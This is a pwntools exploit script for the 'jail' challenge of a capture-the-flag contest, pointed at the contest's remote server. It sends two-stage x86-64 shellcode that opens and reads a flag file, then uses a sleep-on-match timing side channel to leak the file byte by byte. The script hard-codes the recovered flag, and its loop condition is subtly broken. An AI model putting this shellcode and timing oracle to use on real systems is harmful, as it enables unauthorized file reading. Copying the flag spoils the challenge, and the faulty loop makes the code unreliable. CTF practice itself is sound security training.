#!/usr/bin/env python3

from pwn import *
import sys
import string

#MyTemplate
elf = ELF("./jail_patched")
context.binary = elf
lokal = False
context.arch = 'amd64'

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,b"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,b"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    a=1
    # xp = process([elf.path])
    # libc = elf.libc #2.27
else:
    host = '2023.ductf.dev'
    port = '30010'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x555555555377 \n c"
    gdb.attach(xp,cmd)

#Exploit Here

p1 = ("""
            mov rdi,0
            mov rax,0
            lea rsi,[rip-21]
            mov rdx,1000
            syscall
            """)

p2 = ("""
            mov rdi, 0x00007478742e6761;
            push rdi;
            mov rdi, 0x6c662f6c6168632f;
            push rdi;

            mov rdi, -100;
            mov rsi, rsp;
            mov rdx, 0;
            mov r10, 0;
            mov rax, 257;
            syscall;

            mov rdi, rax;
            mov rsi, rsp;
            mov rdx, 64;
            mov rax, 0;
            syscall

            xor rcx,rcx
            mov al,[rsp+{}]
            cmp al,{}
            je found
            jmp done

            found:
            push 0
            push 1
            mov rcx,0xbfebfbff
            push rcx
            push 2
            mov rax,35
            mov rdi,rsp
            add rdi,16
            mov rsi,rsp
            mov rdx,rsp
            syscall
            jmp done

            done:
            mov rax,60
            mov rdi,0
            syscall
            """)

def sploit(xp, idx, ch):
    xp.sendlineafter("> ",asm(p1))
    xp.sendline(b"\x90"*30+asm(p2.format(idx,ch)))
    
flag = 'DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}'
while flag[-1 != "}"]:
        print(flag)
        for c in string.printable:
            xp = remote(host,port)
            sploit(xp,len(flag),ord(c))
            a = time.time()
            try:
                xp.recvline()
            except EOFError:
                pass
            if time.time() - a > 0.8:
                flag += c
                break
            xp.close()